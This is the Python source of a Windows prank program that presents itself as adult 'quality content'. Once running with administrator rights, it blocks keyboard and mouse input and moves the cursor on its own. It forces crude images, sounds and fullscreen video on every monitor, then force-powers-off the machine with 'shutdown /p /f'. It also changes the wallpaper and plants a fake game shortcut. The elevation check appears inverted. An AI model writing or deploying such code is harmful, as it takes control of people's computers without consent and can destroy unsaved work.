import ctypes
import logging
import os
import psutil
import screeninfo
import shutil
import sys
import tempfile
import time
import tkinter as tk
import tkinter.ttk as ttk
import tkinter.font as tkfont
import tkinter.messagebox as tkmsgbox
import win32api
from pathlib import Path
from threading import Thread
from win32com.shell import shell, shellcon  # pylint: disable=import-error,no-name-in-module

vlc = None  # Late import


if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    BUNDLE_PATH = Path(sys._MEIPASS)
else:
    BUNDLE_PATH = Path('.')


def get_resource_path(asset):
    return str(BUNDLE_PATH / asset)


LIBVLC_DLL_PATH = get_resource_path('libvlc/libvlc.dll')
ASSETS = {
    'icon': get_resource_path('assets/icon.ico'),
    'ahegao-image': get_resource_path('assets/ahegao.png'),
    'bonk-sound': get_resource_path('assets/bonk.opus'),
    'bonk-image': get_resource_path('assets/bonk.png'),
    'bruh-sound': get_resource_path('assets/bruh.opus'),
    'quality-video': get_resource_path('assets/quality.mkv'),
    'wallpaper-image': get_resource_path('assets/wallpaper.jpg'),
    'yamete-kudasai-sound': get_resource_path('assets/yamete_kudasai.opus')
}


file_formatter = logging.Formatter('%(asctime)s.%(msecs)03d [%(funcName)s] [%(levelname)s]: %(message)s')
console_formatter = logging.Formatter('%(asctime)s.%(msecs)03d [%(levelname)s]: %(message)s')

log = logging.getLogger()
log.setLevel(logging.INFO)
file_handler = logging.FileHandler('udpqc.log')
file_handler.setFormatter(file_formatter)
log.addHandler(file_handler)
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(console_formatter)
log.addHandler(console_handler)


def critical_exit():
    log.error('Exiting due to a critical error')
    log.warning('Unblocking input critical')
    block_input(False)
    sys.exit(1)


def error(msg):
    root = tk.Tk()
    root.withdraw()
    tkmsgbox.showerror('Error', msg)


def block_input(block):
    result = ctypes.windll.user32.BlockInput(block)
    log.warning(f'block_input: {result}')
    return result != 0


def center_window(root):
    root.update()
    width, height = [int(i) for i in root.geometry().split('+')[0].split('x')]
    screen_w = root.winfo_screenwidth()
    screen_h = root.winfo_screenheight()
    pos_x = int(screen_w / 2 - width / 2)
    pos_y = int(screen_h / 2 - height / 2)

    log.info(f'Centering window: {root}, w:{width}, h:{height}, sw:{screen_w}, sh:{screen_h}, x:{pos_x}, y:{pos_y}')
    root.geometry(f'+{pos_x}+{pos_y}')
    root.update()


def animate_cursor(x, y, xd, yd, duration):
    log.info(f'Cursor animation: x:{x}, y:{y}, xd:{xd}, yd:{yd}, d:{duration}')

    pos_x = x
    pos_y = y
    step_x = (xd - x) / (duration * 60.0)
    step_y = (yd - y) / (duration * 60.0)
    frame = 0.015

    win32api.SetCursorPos((x, y))
    start_time = time.time()
    for _ in range(int(duration * 60.0)):
        pos_x += step_x
        pos_y += step_y
        pos_x_int = int(pos_x)
        pos_y_int = int(pos_y)
        win32api.SetCursorPos((pos_x_int, pos_y_int))

        now = time.time()
        while now - start_time < frame:
            time.sleep(0.001)
            now = time.time()
        start_time = now


class App(tk.Frame):

    def __init__(self, root):
        super().__init__(root)
        self.root = root
        self.root.title('Ultimate Deluxe Pro Quality Content')
        self.root.attributes('-topmost', True)

        self.icon = ASSETS['icon']
        self.vlc_sound_instance = vlc.Instance('--mouse-hide-timeout=0')
        self.vlc_sound_player = self.vlc_sound_instance.media_player_new()
        self.button_of = None
        self.button_ph = None
        self.button_ssc = None
        self.button_main = None
        self.player_windows = []
        self.root_focus = True

        try:
            self.root.iconbitmap(self.icon)
        except Exception as e:
            log.error(f'Failed to set root icon: {e}')

        self._init_widgets()
        center_window(self.root)
        self.root.protocol('WM_DELETE_WINDOW', self._on_delete_window)
        self.vlc_sound_player.stop()
        self._repeat_background_tasks()
        log.warning('Blocking input initial')
        block_input(True)
        win32api.SetCursorPos((0, 0))
        self.root.after(1000, self._init_animations)

    def _init_widgets(self):
        log.info('Initializing widgets')

        default_font = tkfont.nametofont('TkDefaultFont')
        default_font.configure(size=12)

        self.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
        for i in range(3):
            self.grid_columnconfigure(i, weight=1)
        self.grid_rowconfigure(1, weight=1)

        button_of = ttk.Button(self, text='𝒪𝓃𝓁𝓎𝐹𝒶𝓃𝓈')
        button_of.grid(row=0, column=0, sticky=tk.NSEW, padx=(0, 4), ipady=4)
        self.button_of = button_of
        button_ph = ttk.Button(self, text='𝒫𝑜𝓇𝓃𝐻𝓊𝒷')
        button_ph.grid(row=0, column=1, sticky=tk.NSEW, ipady=4)
        self.button_ph = button_ph
        button_ssc = ttk.Button(self, text='𝒮𝓊𝓅𝑒𝓇 𝒮𝑒𝒸𝓇𝑒𝓉 𝒞𝑜𝓃𝓉𝑒𝓃𝓉')
        button_ssc.grid(row=0, column=2, sticky=tk.NSEW, padx=(4, 0), ipady=4)
        self.button_ssc = button_ssc
        button_main_image = tk.PhotoImage(file=ASSETS['bonk-image'])
        button_main = ttk.Button(self, image=button_main_image, pad=0)
        button_main.image = button_main_image
        button_main.grid(row=1, column=0, columnspan=3, sticky=tk.NSEW, pady=(4, 0))
        self.button_main = button_main

    def _repeat_background_tasks(self):
        def _focus_root_window():
            if not self.root_focus:
                return
            self.root.lift()
            self.root.focus_force()
            self.root.after(1000, _focus_root_window)

        _focus_root_window()

    def _toplevel_dialog(self):
        log.info('Creating toplevel dialog template')

        toplevel = tk.Toplevel(self.root, bg='#fff')
        try:
            toplevel.iconbitmap(self.icon)
        except Exception as e:
            log.error(f'Failed to set icon on toplevel dialog: {e}')
        toplevel.title('𝒷𝓇𝓊𝒽 𝓂𝑜𝓂𝑒𝓃𝓉𝑜')
        toplevel.minsize(200, 100)
        toplevel.resizable(False, False)
        toplevel.transient(self.root)
        toplevel.lift()
        toplevel.focus_force()
        toplevel.grab_set_global()

        return toplevel

    def _fake_msgbox(self, text):
        log.info('Creating fake messagebox')

        toplevel = self._toplevel_dialog()
        frame = tk.Frame(toplevel, bg='#fff')
        frame.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
        label = tk.Label(frame, text=text, bg='#fff', font=(None, 20))
        label.pack(anchor=tk.CENTER, expand=True)

        center_window(toplevel)
        toplevel.update()
        return toplevel

    def _fake_imgbox(self, img):
        log.info('Creating fake imagebox')

        toplevel = self._toplevel_dialog()
        frame = tk.Frame(toplevel, bg='#fff')
        frame.pack(expand=True, fill=tk.BOTH)
        label_image = tk.PhotoImage(file=img)
        label = tk.Label(frame, image=label_image, bg='#fff')
        label.image = label_image
        label.pack(anchor=tk.CENTER, expand=True)

        center_window(toplevel)
        toplevel.update()
        return toplevel

    def _on_delete_window(self, *args):
        pass

    def _vlc_player_stopped(self, player):
        state = player.get_state()
        return state in (
            vlc.State.Ended,
            vlc.State.Error,
            vlc.State.Paused,
            vlc.State.Stopped
        )

    def _init_player_windows(self):
        log.info('Initializing video player toplevel windows')

        no_audio = False
        monitors = screeninfo.get_monitors()
        if len(monitors) > 1:
            log.info('Preparing multi monitor setup')
            for monitor in screeninfo.get_monitors():
                toplevel, player = self._create_player_window(
                    monitor.x,
                    monitor.y,
                    monitor.width,
                    monitor.height,
                    True,
                    no_audio
                )
                no_audio=True
                self.player_windows.append((toplevel, player))
        else:
            log.info('Preparing single monitor setup')
            toplevel, player = self._create_player_window()
            self.player_windows.append((toplevel, player))

    def _create_player_window(self, x=0, y=0, width=None, height=None, multi_monitor=False, no_audio=False):
        toplevel = tk.Toplevel(self.root, cursor=tk.NONE)
        try:
            toplevel.iconbitmap(self.icon)
        except Exception as e:
            log.error(f'Failed to set icon on player window: {e}')
        print('-------------------------', x, y, width, height)
        if multi_monitor:
            toplevel.overrideredirect(True)
            toplevel.geometry(f'{width}x{height}+{x}+{y}')
        else:
            toplevel.geometry(f'{self.root.winfo_screenwidth()}x{self.root.winfo_screenheight()}+0+0')
            toplevel.attributes('-fullscreen', True)
        toplevel.update()
        toplevel.attributes('-topmost', True)
        toplevel.lift()
        toplevel.focus_force()
        toplevel.grab_set_global()
        toplevel.attributes('-alpha', 0.0)

        frame = tk.Frame(toplevel, bg='#000')
        frame.pack(expand=True, fill=tk.BOTH)

        canvas = tk.Canvas(frame, bg='#000', bd=0, highlightthickness=0, relief=tk.FLAT)
        canvas.pack(expand=True, fill=tk.BOTH)

        options = ['--mouse-hide-timeout=0', '--no-video-title-show']
        if no_audio:
            options.append('--no-audio')
        instance = vlc.Instance(options)
        media = instance.media_new(ASSETS['quality-video'])
        player = instance.media_player_new()
        player.set_hwnd(canvas.winfo_id())
        player.set_media(media)

        toplevel.protocol('WM_DELETE_WINDOW', self._on_delete_window)

        return (toplevel, player)

    def _init_animations(self):
        button_of_coords = (
            int(self.button_of.winfo_rootx() + (self.button_of.winfo_width() / 2)),
            int(self.button_of.winfo_rooty() + (self.button_of.winfo_height() / 2)),
        )
        button_ph_coords = (
            int(self.button_ph.winfo_rootx() + (self.button_ph.winfo_width() / 2)),
            int(self.button_ph.winfo_rooty() + (self.button_ph.winfo_height() / 2)),
        )
        button_ssc_coords = (
            int(self.button_ssc.winfo_rootx() + (self.button_ssc.winfo_width() / 2)),
            int(self.button_ssc.winfo_rooty() + (self.button_ssc.winfo_height() / 2)),
        )
        button_main_coords = (
            int(self.button_main.winfo_rootx() + (self.button_main.winfo_width() / 2)),
            int(self.button_main.winfo_rooty() + (self.button_main.winfo_height() / 2)),
        )

        def anim_1():
            log.info('anim_1 started')
            t = Thread(
                target=animate_cursor,
                args=(0, 0, button_of_coords[0], button_of_coords[1], 3.0),
                daemon=True
            )
            t.start()

            def anim_1_update():
                if t.is_alive():
                    self.root.after(100, anim_1_update)
                    return
                log.info('anim_1 finished')
                self.root.after(500, anim_2)
            anim_1_update()

        def anim_2():
            log.info('anim_2 started')
            t = Thread(
                target=animate_cursor,
                args=(button_of_coords[0], button_of_coords[1], button_ssc_coords[0], button_ssc_coords[1], 2.0),
                daemon=True
            )
            t.start()

            def anim_2_update():
                if t.is_alive():
                    self.root.after(100, anim_2_update)
                    return
                log.info('anim_2 finished')
                self.root.after(500, anim_3)
            anim_2_update()

        def anim_3():
            log.info('anim_3 started')
            t = Thread(
                target=animate_cursor,
                args=(button_ssc_coords[0], button_ssc_coords[1], button_of_coords[0], button_of_coords[1], 2.0)
            )
            t.start()

            def anim_3_update():
                if t.is_alive():
                    self.root.after(100, anim_3_update)
                    return
                log.info('anim_3 finished')
                self.root.after(1000, anim_4)
            anim_3_update()

        def anim_4():
            log.info('anim_4 started')

            def anim_4_1():
                self.button_of.config(state=tk.DISABLED)
                self.root.after(250, anim_4_2)

            def anim_4_2():
                self.button_of.config(state=tk.NORMAL)
                self.root.after(250, anim_4_3)

            def anim_4_3():
                fake_imgbox = self._fake_imgbox(ASSETS['ahegao-image'])
                media = self.vlc_sound_instance.media_new(ASSETS['yamete-kudasai-sound'])
                self.vlc_sound_player.set_media(media)
                self.vlc_sound_player.play()

                timeout_start = time.time()
                def anim_4_3_update():
                    if self._vlc_player_stopped(self.vlc_sound_player) or (time.time() - timeout_start >= 10):
                        self.vlc_sound_player.stop()
                        media.release()
                        self.root.after(500, anim_4_4, fake_imgbox)
                        return
                    self.root.after(100, anim_4_3_update)
                anim_4_3_update()

            def anim_4_4(widget):
                widget.destroy()
                log.info('anim_4 finished')
                self.root.after(1000, anim_5)

            anim_4_1()

        def anim_5():
            log.info('anim_5 started')
            t = Thread(
                target=animate_cursor,
                args=(button_of_coords[0], button_of_coords[1], button_ph_coords[0], button_ph_coords[1], 1.0),
                daemon=True
            )
            t.start()

            def anim_5_update():
                if t.is_alive():
                    self.root.after(100, anim_5_update)
                    return
                log.info('anim_5 finished')
                self.root.after(1000, anim_6)
            anim_5_update()

        def anim_6():
            log.info('anim_6 started')

            def anim_6_1():
                self.button_ph.config(state=tk.DISABLED)
                self.root.after(250, anim_6_2)

            def anim_6_2():
                self.button_ph.config(state=tk.NORMAL)
                self.root.after(250, anim_6_3)

            def anim_6_3():
                fake_msgbox = self._fake_msgbox(
                    "You don't have access to 𝒫𝑜𝓇𝓃𝐻𝓊𝒷 right now,\n"
                    "because you're качамак"
                )

                media = self.vlc_sound_instance.media_new(ASSETS['bruh-sound'])
                self.vlc_sound_player.set_media(media)
                self.vlc_sound_player.play()

                timeout_start = time.time()
                def anim_6_3_update():
                    if self._vlc_player_stopped(self.vlc_sound_player) or (time.time() - timeout_start >= 10):
                        self.vlc_sound_player.stop()
                        media.release()
                        self.root.after(4000, anim_6_4, fake_msgbox)
                        return

                    self.root.after(100, anim_6_3_update)
                anim_6_3_update()

            def anim_6_4(widget):
                widget.destroy()
                log.info('anim_6 finished')
                self.root.after(1000, anim_7)

            anim_6_1()

        def anim_7():
            log.info('anim_7 started')
            t = Thread(
                target=animate_cursor,
                args=(button_ph_coords[0], button_ph_coords[1], button_main_coords[0], button_main_coords[1], 1.0),
                daemon=True
            )
            t.start()

            def anim_7_update():
                if t.is_alive():
                    self.root.after(100, anim_7_update)
                    return
                log.info('anim_7 finished')
                self.root.after(1000, anim_8)
            anim_7_update()

        def anim_8():
            log.info('anim_8 started')

            def anim_8_1():
                self.button_main.config(state=tk.DISABLED)
                self.root.after(250, anim_8_2)

            def anim_8_2():
                self.button_main.config(state=tk.NORMAL)
                self.root.after(250, anim_8_3)

            def anim_8_3():
                media = self.vlc_sound_instance.media_new(ASSETS['bonk-sound'])
                self.vlc_sound_player.set_media(media)
                self.vlc_sound_player.play()

                timeout_start = time.time()
                def anim_8_3_update():
                    if self._vlc_player_stopped(self.vlc_sound_player) or (time.time() - timeout_start >= 10):
                        self.vlc_sound_player.stop()
                        media.release()
                        log.info('anim_8 finished')
                        self.root.after(500, anim_9)
                        return
                    self.root.after(100, anim_8_3_update)
                anim_8_3_update()

            anim_8_1()

        def anim_9():
            log.info('anim_9 started')
            self.root_focus = False
            duration = 1.0
            total_frames = int(duration * 60)
            step = 1.0 / total_frames
            anim_9.alpha = 0.0
            anim_9.current_frame = 0

            try:
                self._init_player_windows()
            except Exception as e:
                log.error(f'Failed to initialize player windows: {e}')
                error(f'Failed to initialize player windows: {e}')
                critical_exit()

            def anim_9_1():
                anim_9.alpha += step
                for player_window in self.player_windows:
                    player_window[0].attributes('-alpha', anim_9.alpha)
                anim_9.current_frame += 1

                if anim_9.current_frame < total_frames:
                    self.root.after(16, anim_9_1)
                    return

                for player_window in self.player_windows:
                    player_window[0].attributes('-alpha', 1.0)
                anim_9_2()

            def anim_9_2():
                for player_window in self.player_windows:
                    player_window[1].play()
                for player_window in self.player_windows:
                    player_window[0].lift()
                    player_window[0].focus_force()
                anim_9_3()

            def anim_9_3():
                timeout_start = time.time()
                def anim_9_3_update():
                    players_stopped = []
                    for player_window in self.player_windows:
                        players_stopped.append(self._vlc_player_stopped(player_window[1]))

                    if all(players_stopped) or (time.time() - timeout_start >= 35):
                        log.info('Video players finished, shutting down and exitting')
                        shutdown_computer()
                        self.root.after(10000, cleanup_and_exit)
                        log.info('anim_9 finished')
                        return
                    self.root.after(1000, anim_9_3_update)
                anim_9_3_update()

                log.info('Scheduling final tasks after 10 seconds')
                self.root.after(10000, set_wallpaper)
                self.root.after(10000, create_shortcut)

            anim_9_1()

        def set_wallpaper():
            dest_path = Path(tempfile.gettempdir()).joinpath('udpqc-wallpaper.jpg')

            try:
                log.info(f'Copying wallpaper to: {dest_path}')
                shutil.copyfile(ASSETS['wallpaper-image'], dest_path, follow_symlinks=True)
            except Exception as e:
                log.error(f"Failed to copy wallpaper to '{dest_path}': {e}")
                return

            try:
                log.info(f'Setting wallpaper to: {dest_path}')
                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(dest_path), 1)
            except Exception as e:
                log.error(f'Failed to set wallpaper: {e}')

        def create_shortcut():
            user_documents_path = shell.SHGetFolderPath(0, shellcon.CSIDL_PERSONAL, None, 0)
            dest_path = Path(user_documents_path).joinpath('Grand Theft Auto VI.url')

            if dest_path.exists():
                log.error(f'Cancelling shortcut creation, file already exists at: {dest_path}')
                return

            try:
                with open(dest_path, 'w', encoding='utf-8') as f:
                    log.info(f'Writing shortcut to: {dest_path}')
                    f.write('[InternetShortcut]\nURL=https://www.youtube.com/watch?v=dQw4w9WgXcQ\n')
            except Exception as e:
                log.error(f'Failed to create shortcut: {e}')

        def shutdown_computer():
            try:
                os.system('shutdown /p /f')
            except Exception as e:
                log.error(f'Failed to shutdown system: {e}')
                self.root.destroy()
                critical_exit()

        def cleanup_and_exit():
            log.warning('Unblocking input finish')
            block_input(False)
            self.root.destroy()
            sys.exit()

        anim_1()


def main():
    # Set process priority to high
    try:
        log.info("Setting process priority to 'HIGH_PRIORITY_CLASS'")
        psutil.Process(os.getpid()).nice(psutil.HIGH_PRIORITY_CLASS)
    except Exception as e:
        log.error(f'Failed to set process priority: {e}')

    # Validate assets
    asset_paths = [v for k, v in ASSETS.items()]
    for asset in asset_paths:
        if not Path(asset).is_file():
            log.error(f'Missing asset: {asset}')
            error('Missing assets. Please verify that you have extracted the application properly before running.')
            sys.exit(1)

    # Try to import VLC
    os.environ['PYTHON_VLC_LIB_PATH'] = LIBVLC_DLL_PATH
    global vlc
    try:
        import vlc
    except Exception as e:
        log.error(f'Failed to import libVLC: {type(e).__name__}: {e}')
        error(f'Failed to import libVLC: {type(e).__name__}: {e}')
        sys.exit(1)

    # Request elevation if not running as administrator
    if ctypes.windll.shell32.IsUserAnAdmin():
        log.warning('Running as non-administrator')
        try:
            log.warning('Launching process as administrator')
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
        except Exception as e:
            log.error(f'Failed to launch process as administrator: {e}')
            error(f'Failed to launch process as administrator: {e}')
        sys.exit(1)
    log.info('Running as administrator')

    # Limit application to single instance
    try:
        lock_file = Path(tempfile.gettempdir()).joinpath('Ultimate_Deluxe_Pro_Quality_Content.lock').resolve()
        if lock_file.is_file():
            log.info('Reading existing lock file')
            with open(lock_file, 'r', encoding='utf-8') as f:
                pid = int(f.read())
                print(pid, psutil.Process(pid).is_running())
                try:
                    if psutil.Process(pid).is_running():
                        log.error('Another instance is already running')
                        sys.exit(1)
                except psutil.Error:
                    pass
    except Exception as e:
        log.error(f'Exception while reading lock file: {e}')
    try:
        log.info(f'Writing lock file to: {lock_file}')
        with open(lock_file, 'w', encoding='utf-8') as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log.error(f'Exception while writing lock file: {e}')
        sys.exit(1)

    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception as e:
        log.error(f'Failed to set DPI awareness: {e}')

    try:
        root = tk.Tk()
        app = App(root)
        app.root.mainloop()
    except Exception as e:
        log.error(f'mainloop exception: {e}')
        log.warning('Unblocking input on mainloop exception')
        block_input(False)
        error(f'mainloop exception: {e}')
        critical_exit()


if __name__ == '__main__':
    main()
